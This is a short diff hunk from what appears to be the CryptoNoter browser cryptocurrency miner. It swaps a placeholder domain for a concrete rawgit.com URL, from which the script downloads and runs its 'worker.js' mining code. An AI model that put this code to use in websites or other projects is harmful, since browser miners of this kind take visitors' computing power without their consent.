@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
+            xhr.open("get", "https://rawgit.com/w601sxs/Project-S.001/master/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
